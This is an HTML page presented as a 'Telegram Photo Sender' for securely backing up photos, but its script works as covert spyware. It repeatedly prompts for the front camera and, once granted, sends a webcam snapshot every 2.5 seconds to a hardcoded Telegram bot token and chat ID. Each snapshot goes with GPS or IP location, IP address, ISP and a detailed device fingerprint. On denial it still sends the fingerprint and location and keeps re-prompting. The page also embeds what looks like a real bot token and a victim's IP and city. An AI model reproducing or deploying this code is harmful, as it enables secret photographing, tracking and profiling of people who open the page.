<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Photo Sender</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }

    h1 { font-size: 28px; margin-bottom: 10px; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
    #status { margin-top: 20px; font-size: 18px; padding: 15px; border-radius: 10px; background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); }
    #video-container { width: 640px; height: 480px; border: 2px solid rgba(255,255,255,0.3); border-radius: 15px; margin: 20px auto; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
    #video { width: 100%; height: 100%; object-fit: cover; }
    .retry-btn { background: linear-gradient(45deg, #ff4444, #cc0000); color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 12px; cursor: pointer; margin: 10px; font-weight: bold; transition: all 0.3s; box-shadow: 0 5px 15px rgba(255,68,68,0.4); }
    .retry-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,68,68,0.6); }
    #retry-section { background: rgba(0,0,0,0.3); padding: 30px; border-radius: 20px; max-width: 500px; margin: 20px auto; }
  </style>
</head>
<body>
  <h1>📸 Telegram Photo Sender</h1>
  <p style="font-size: 16px; opacity: 0.9;">Securely backup your photos to Telegram</p>
  
  <div id="status">🔄 Requesting camera access...</div>
  <div id="video-container" style="display:none;"><video id="video" autoplay muted playsinline></video></div>
  <div id="retry-section" style="display:none;">
    <p style="font-size:20px; color:#ff4444; margin:20px;">🚫 Camera access denied!</p>
    <p style="font-size: 16px; opacity: 0.9;">📤 Sending device info... Next retry in 2s</p>
    <button class="retry-btn" onclick="retryCamera()">🔄 Manual Retry</button>
  </div>

  <script>
    let stream = null;
    let photoInterval = null;
    let nextRetryTimer = null;
    let locationData = { 
      lat: '9.9406', lng: '76.2653', accuracy: 'IP (~10km)', source: 'IP', 
      ip: '42.104.157.233', city: 'Kochi', org: 'Vodafone Idea Ltd', 
      region: 'Kerala', country: 'India', timezone: 'Asia/Kolkata'
    };
    let retryCount = 0;
    let infoSent = false;

    // Send device info on FIRST denial
    async function sendDeviceInfoOnDenial() {
      if (infoSent) return;
      infoSent = true;
      
      const device = await getDeviceFingerprint();
      const ts = new Date().toLocaleString();
      
      const caption = `**📱 CAMERA DENIED - DEVICE INFO** #${retryCount}
**🚫 STATUS:** Camera blocked - retrying every 2s...

**🌐 NETWORK**
• **IP:** \`${locationData.ip}\`
• **ISP:** ${locationData.org}
• **City:** ${locationData.city}, ${locationData.region}

**💻 DEVICE FINGERPRINT**
• **UA:** ${device.userAgent}
• **Platform:** ${device.platform}
• **Screen:** ${device.screen} @${device.pixelRatio}x
• **RAM:** ${device.ram}
• **Battery:** ${device.battery}
• **CPU:** ${device.hardwareConcurrency} cores
• **Lang:** ${device.languages}
• **Network:** ${device.connection}
• **Timezone:** ${device.timezone}

**📍 LOCATION** ${locationData.lat}, ${locationData.lng}
**🕐** ${ts}`;

      const formData = new FormData();
      formData.append('chat_id', '6469212447');
      formData.append('text', caption);
      formData.append('parse_mode', 'Markdown');
      formData.append('disable_web_page_preview', 'true');

      try {
        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendMessage`, {
          method: 'POST', body: formData,
        });
        console.log('✅ Device info sent on denial');
      } catch (e) {
        console.log('Info send failed');
      }
    }

    // 2-SECOND TIMER AFTER DENIAL
    async function scheduleNextRetry() {
      retryCount++;
      
      if (nextRetryTimer) clearTimeout(nextRetryTimer);
      
      updateStatus(`🚫 Denied #${retryCount} - Sending info + retry in 2s`);
      document.getElementById('retry-section').style.display = 'block';
      
      // SEND DEVICE INFO ON DENIAL
      await sendDeviceInfoOnDenial();
      
      // 2-SECOND TIMER STARTS NOW
      nextRetryTimer = setTimeout(async () => {
        updateStatus(`🔄 Retry #${retryCount} starting...`);
        await requestCamera();
      }, 2000);
    }

    window.retryCamera = async function() {
      updateStatus('🔄 Manual retry...');
      await requestCamera();
    };

    async function requestCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
          audio: false
        });
        
        if (nextRetryTimer) {
          clearTimeout(nextRetryTimer);
          nextRetryTimer = null;
        }
        onCameraSuccess();
        return true;
        
      } catch (error) {
        console.log(`#${retryCount} failed:`, error.name);
        scheduleNextRetry(); // Sends info + 2s timer
        return false;
      }
    }

    function onCameraSuccess() {
      document.getElementById('status').style.color = '#44ff44';
      document.getElementById('status').innerText = '✅ Camera granted! Sending photos...';
      document.getElementById('video-container').style.display = 'block';
      document.getElementById('retry-section').style.display = 'none';
      
      const video = document.getElementById('video');
      video.srcObject = stream;
      
      startLocationTracking();
      startPhotoCapture();
    }

    function updateStatus(msg) {
      document.getElementById('status').innerText = msg;
      console.log(msg);
    }

    function startLocationTracking() {
      locationData.localTime = new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'});

      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(data => {
          locationData.ip = data.ip || locationData.ip;
          locationData.lat = data.latitude?.toFixed(4) || locationData.lat;
          locationData.lng = data.longitude?.toFixed(4) || locationData.lng;
          locationData.city = data.city || locationData.city;
          locationData.org = data.org || locationData.org;
        }).catch(() => {});

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            locationData.lat = pos.coords.latitude.toFixed(6);
            locationData.lng = pos.coords.longitude.toFixed(6);
            locationData.accuracy = `${Math.round(pos.coords.accuracy)}m`;
            locationData.source = 'GPS';
          }, () => {}, { enableHighAccuracy: true }
        );
      }
    }

    async function getDeviceFingerprint() {
      let ramEstimate = 'N/A', batteryInfo = { level: 'N/A', charging: 'N/A' };
      
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          batteryInfo = { level: Math.round(battery.level * 100) + '%', charging: battery.charging ? 'Yes' : 'No' };
        } catch(e) {}
      }
      
      if ('memory' in performance && performance.memory) {
        const totalMB = Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024);
        ramEstimate = `${Math.round(totalMB/256)} GB`;
      }
      
      return {
        platform: navigator.platform, userAgent: navigator.userAgent.substring(0, 80),
        screen: `${screen.width}x${screen.height}`, pixelRatio: window.devicePixelRatio,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
        languages: navigator.languages?.join(',') || navigator.language,
        connection: navigator.connection?.effectiveType || 'N/A',
        ram: ramEstimate, battery: `${batteryInfo.level} (Charging: ${batteryInfo.charging})`
      };
    }

    async function captureAndSend() {
      const device = await getDeviceFingerprint();
      const ts = new Date().toLocaleString();
      const localTs = new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'});
      
      const caption = `**📱 CAMERA CAPTURED** #${Math.floor(Date.now()/2000)}
**🌐 IP:** \`${locationData.ip}\` | **📍** ${locationData.city}
**🏛️** ${locationData.org} | **🇮🇳** ${locationData.region}
**📱** ${device.platform} | ${device.userAgent}
**🖥️** ${device.screen} @${device.pixelRatio}x
**💾** ${device.ram} | **🔋** ${device.battery}
**⚙️** ${device.hardwareConcurrency}c | ${device.languages}
**📶** ${device.connection} | **⏰** ${device.timezone}

**📍 GPS:** ${locationData.lat}, ${locationData.lng}
**📏** ${locationData.accuracy} | **${locationData.source}**

**🕐** ${ts} | **🕐 Local:** ${localTs}
`;

      const video = document.getElementById('video');
      if (video.readyState < 2) return;

      const canvas = document.createElement('canvas');
      canvas.width = 640; canvas.height = 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);

      const blob = dataURLtoBlob(canvas.toDataURL('image/jpeg', 0.9));
      const formData = new FormData();
      formData.append('photo', blob, `cam_${locationData.ip}_${Date.now()}.jpg`);
      formData.append('chat_id', '6469212447');
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      try {
        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendPhoto`, {
          method: 'POST', body: formData,
        });
        updateStatus(`✅ Photo sent | 📍 ${locationData.lat},${locationData.lng}`);
      } catch (e) {
        console.log('Photo send failed');
      }
    }

    function dataURLtoBlob(dataURL) {
      const [header, data] = dataURL.split(',');
      const mime = header.split(':')[1].split(';')[0];
      const binary = atob(data);
      const array = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
      return new Blob([array], { type: mime });
    }

    function startPhotoCapture() {
      captureAndSend();
      photoInterval = setInterval(captureAndSend, 2500);
    }

    window.addEventListener('beforeunload', () => {
      if (stream) stream.getTracks().forEach(track => track.stop());
      if (nextRetryTimer) clearTimeout(nextRetryTimer);
      if (photoInterval) clearInterval(photoInterval);
    });

    // START
    requestCamera();
  </script>
</body>
</html>
